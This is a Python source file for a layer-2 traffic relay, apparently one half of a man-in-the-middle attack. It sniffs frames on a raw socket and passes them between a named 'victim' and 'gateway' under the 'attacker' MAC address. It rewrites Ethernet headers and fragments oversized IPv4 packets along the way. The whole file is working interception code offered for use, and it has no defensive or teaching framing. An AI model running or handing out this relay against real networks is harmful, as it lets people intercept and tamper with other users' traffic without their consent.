#!/usr/bin/env python3
# fast_l2_redirect.py (with IPv4 fragmentation)
import os, sys, socket
settings = {}

with open("puller.settings", "r") as f:
    for line in f.readlines():
        settings_name, setting = line.split(" ")
        settings[settings_name.strip()] = setting.strip()

if settings.get("mobile", "no") == "yes":
    from fcntl import ioctl

import struct

ETH_P_ALL = 0x0003
SIOCGIFHWADDR = 0x8927
SIOCGIFINDEX  = 0x8933
SIOCGIFMTU    = 0x8921

def if_hwaddr(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = ioctl(s.fileno(), SIOCGIFHWADDR, struct.pack('256s', ifname[:15].encode()))
    return info[18:24]

def if_index(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifreq = struct.pack('256s', ifname[:15].encode())
    res = ioctl(s.fileno(), SIOCGIFINDEX, ifreq)
    return struct.unpack('i', res[16:20])[0]

def if_mtu(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifreq = struct.pack('256s', ifname[:15].encode())
    res = ioctl(s.fileno(), SIOCGIFMTU, ifreq)
    return struct.unpack('i', res[16:20])[0]

def resolve_mac_ip(iface, ip):
    # quick arp resolution using a temporary raw socket sending ARP request (requires root)
    # This is a minimal method; you can also call `arp -n` externally.
    import subprocess
    try:
        out = subprocess.check_output(["ip", "neigh", "show", "to", ip]).decode(errors='ignore')
    except subprocess.CalledProcessError:
        return None
    # expected: "192.168.1.1 lladdr aa:bb:cc:dd:ee:ff REACHABLE dev wlan0"
    for part in out.split():
        if ':' in part and len(part.split(':'))==6:
            return bytes(int(b,16) for b in part.split(':'))
    return None

def mac_str_to_bytes(mac):
    return bytes(int(x,16) for x in mac.split(':'))

def ipv4_checksum(header_bytes):
    # header_bytes length must be even
    total = 0
    # work on 16-bit words
    for i in range(0, len(header_bytes), 2):
        word = (header_bytes[i] << 8) + header_bytes[i+1]
        total += word
    # add carries
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF

def fragment_ipv4_packet(ip_header, ip_payload, mtu):
    """
    ip_header: bytes of the IPv4 header (including options if any)
    ip_payload: bytes of the IP payload
    mtu: integer MTU of the outgoing interface (bytes)
    Returns: list of (ip_header_bytes, ip_payload_bytes) for each fragment (header with correct fields)
    Notes: this function assumes ip_header length is ihl*4 and requires ihl == 5 (no options).
    """
    # parse minimal fields
    if len(ip_header) < 20:
        return None
    version_ihl = ip_header[0]
    ihl = version_ihl & 0x0F
    if ihl != 5:
        # we don't handle IP options here
        return None

    total_len = struct.unpack('!H', ip_header[2:4])[0]
    ident = struct.unpack('!H', ip_header[4:6])[0]
    flags_frag = struct.unpack('!H', ip_header[6:8])[0]
    flags = (flags_frag & 0xE000) >> 13  # 3 bits
    df_flag = (flags & 0x2) != 0
    # fragment offset in bytes:
    #frag_offset = (flags_frag & 0x1FFF) * 8

    ip_header_no_checksum = bytearray(ip_header)
    # compute header length in bytes
    hdr_len = ihl * 4

    # IP header bytes that must be carried into each fragment (we will reuse most fields)
    # Determine maximum payload per fragment: mtu - ip_header_len
    max_payload = mtu - hdr_len
    if max_payload <= 0:
        return None

    # each fragment except last must have a payload length that's a multiple of 8 bytes
    fragment_step = (max_payload // 8) * 8
    if fragment_step == 0:
        # MTU too small to carry minimum fragment unit (8 bytes)
        return None

    fragments = []
    offset = 0
    payload_len = len(ip_payload)
    while offset < payload_len:
        chunk = ip_payload[offset: offset + fragment_step]
        is_last = (offset + len(chunk)) >= payload_len

        # Build new IP header for the fragment:
        new_hdr = bytearray(ip_header_no_checksum)  # copy original header
        # total length = header + payload for this fragment
        new_total = hdr_len + len(chunk)
        new_hdr[2:4] = struct.pack('!H', new_total)

        # flags/fragoffset: keep DF bit as-is (we already check df_flag separately),
        # set MF for non-last fragments, and set fragment offset (in 8-byte units)
        frag_offset_units = offset // 8
        mf_bit = 1 if (not is_last) else 0

        # Compose flags (3 top bits). We'll keep reserved bit 0.
        flags_bits = (mf_bit & 0x1) | ((1 if df_flag else 0) << 1)  # MF in LSB, DF in middle bit
        # But the 3-bit field order is: Reserved (bit2), DF (bit1), MF (bit0).
        # Our flags_bits currently has DF in bit1 and MF in bit0 if df_flag set.
        composed = ((0 << 2) | ((1 if df_flag else 0) << 1) | (1 if mf_bit else 0))  # 3 bits

        flags_frag_field = (composed << 13) | (frag_offset_units & 0x1FFF)
        new_hdr[6:8] = struct.pack('!H', flags_frag_field)

        # set checksum to zero then compute
        new_hdr[10:12] = b'\x00\x00'
        chksum = ipv4_checksum(bytes(new_hdr[:hdr_len]))
        new_hdr[10:12] = struct.pack('!H', chksum)

        fragments.append((bytes(new_hdr[:hdr_len]), bytes(chunk)))
        offset += len(chunk)

    return fragments

def handle_and_forward_frame(s, frame, src_mac, dst_mac, a_mac, tgt_mac, iface_mtu):
    """
    s: socket
    frame: memoryview or bytes of full ethernet frame (including 14-byte eth header)
    src_mac: original source MAC (bytes)
    dst_mac: original destination MAC (bytes)
    a_mac: attacker MAC (bytes) - we will use as source for forwarded frames
    tgt_mac: MAC to which we want to send (destination) (bytes) - e.g. gateway or victim
    iface_mtu: interface MTU (int)
    """
    # Prepare base ethernet header for forwarded packets
    eth_type = struct.unpack('!H', frame[12:14])[0]
    # Only attempt fragmentation for IPv4 (0x0800)
    if eth_type != 0x0800:
        # simply rewrite dst/src and send if small enough
        new_frame = bytearray(frame)  # mutable copy
        new_frame[0:6] = tgt_mac
        new_frame[6:12] = a_mac
        if len(new_frame) - 14 > iface_mtu:
            # too big and not IPv4 => drop (can't fragment safely)
            # log
            print("non-IPv4 oversized frame dropped (len)", len(new_frame) - 14, "mtu", iface_mtu)
            return
        s.send(new_frame)
        return

    # IPv4 -> parse header
    ip_hdr_offset = 14
    if len(frame) < ip_hdr_offset + 20:
        return
    ip_first = frame[ip_hdr_offset: ip_hdr_offset+20]
    ihl = ip_first[0] & 0x0F
    hdr_len = ihl * 4
    if len(frame) < ip_hdr_offset + hdr_len:
        return
    ip_header = bytes(frame[ip_hdr_offset: ip_hdr_offset + hdr_len])
    total_len = struct.unpack('!H', ip_header[2:4])[0]
    # sanity check bounds
    if total_len < hdr_len:
        return
    ip_payload = bytes(frame[ip_hdr_offset + hdr_len: ip_hdr_offset + total_len])

    # If the outgoing MTU is sufficient, just rewrite and send
    if len(ip_payload) + hdr_len <= iface_mtu:
        new_frame = bytearray(frame)
        new_frame[0:6] = tgt_mac
        new_frame[6:12] = a_mac
        s.send(new_frame)
        return

    # Need fragmentation
    # check DF bit
    flags_frag = struct.unpack('!H', ip_header[6:8])[0]
    flags = (flags_frag & 0xE000) >> 13
    df_flag = (flags & 0x2) != 0
    if df_flag:
        # Can't fragment; RFC says to send ICMP Fragmentation Needed to sender;
        # here we'll log and drop. You may implement ICMP Frag Needed if desired.
        print("DF set and packet too large -> dropping (would need to send ICMP Frag Needed).")
        return

    # Only support IHL == 5 (no options) to keep complexity manageable
    if ihl != 5:
        print("IP options present (IHL != 5) - not fragmenting (len IHL)", ihl)
        return

    fragments = fragment_ipv4_packet(ip_header, ip_payload, iface_mtu)
    if not fragments:
        print("fragmentation failed or not possible")
        return

    # For each fragment, build ethernet frame and send
    for frag_hdr, frag_payload in fragments:
        eth = bytearray()
        eth += tgt_mac                     # dst
        eth += a_mac                       # src
        eth += struct.pack('!H', 0x0800)   # ethertype IPv4
        eth += frag_hdr
        eth += frag_payload
        try:
            s.send(bytes(eth))
        except Exception as e:
            print("send error:", e)

def main(IFACE, VICTIM, GATEWAY):
    if os.geteuid() != 0:
        print("run as root")
        sys.exit(1)

    victim_mac = resolve_mac_ip(IFACE, VICTIM)
    gateway_mac = resolve_mac_ip(IFACE, GATEWAY)
    if not victim_mac or not gateway_mac:
        print("couldn't resolve macs")
        sys.exit(1)

    attacker_mac = if_hwaddr(IFACE)
    ifindex = if_index(IFACE)
    iface_mtu = if_mtu(IFACE)

    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 * 1024 * 1024)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    s.bind((IFACE, 0))

    # pre-allocated buffer for recvfrom_into
    MAX_FRAME = 65536
    buf = bytearray(MAX_FRAME)

    v_mac = victim_mac
    g_mac = gateway_mac
    a_mac = attacker_mac

    print("attacker mac:", ':'.join(f"{b:02x}" for b in a_mac))
    print("victim mac:", ':'.join(f"{b:02x}" for b in v_mac))
    print("gateway mac:", ':'.join(f"{b:02x}" for b in g_mac))
    print("interface MTU:", iface_mtu)
    print("starting loop...")

    try:
        while True:
            # recv into buffer (zero allocation)
            nbytes, ancdata, flags, addr = s.recvmsg_into([buf], 0)
            if nbytes <= 14:  # too small for Ethernet
                continue
            frame = memoryview(buf)[:nbytes]

            src = bytes(frame[6:12])
            # ignore frames we injected
            if src == a_mac:
                continue
            try:
                if src == v_mac:
                    # victim -> gateway path: fragment if needed
                    handle_and_forward_frame(s, frame, v_mac, g_mac, a_mac, g_mac, iface_mtu)
                elif src == g_mac:
                    # gateway -> victim path: fragment if needed
                    handle_and_forward_frame(s, frame, g_mac, v_mac, a_mac, v_mac, iface_mtu)
                else:
                    continue
            except Exception as e:
                print("processing error:", e)

    except KeyboardInterrupt:
        pass
